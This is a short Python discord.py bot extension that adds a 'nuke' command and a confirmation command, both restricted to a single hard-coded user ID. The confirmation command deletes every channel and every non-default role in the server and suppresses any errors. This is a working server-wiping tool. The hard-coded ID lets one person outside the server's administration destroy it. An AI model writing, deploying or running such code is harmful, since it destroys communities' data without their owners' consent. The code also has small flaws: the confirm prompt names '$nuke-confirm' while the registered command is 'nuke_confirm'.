import discord
from discord.ext import commands

ALLOWED_USER_ID = 1537816435370229820


def setup(bot):

    @bot.command()
    async def nuke(ctx):

        if ctx.author.id != ALLOWED_USER_ID:
            return

        await ctx.send(
            "⚠️ פעולה מסוכנת. כתוב `$nuke-confirm` כדי לאשר."
        )

    @bot.command()
    async def nuke_confirm(ctx):

        if ctx.author.id != ALLOWED_USER_ID:
            return

        guild = ctx.guild

        for channel in list(guild.channels):
            try:
                await channel.delete()
            except (discord.Forbidden, discord.HTTPException):
                pass

        for role in list(guild.roles):
            if role.is_default():
                continue

            try:
                await role.delete()
            except (discord.Forbidden, discord.HTTPException):
                pass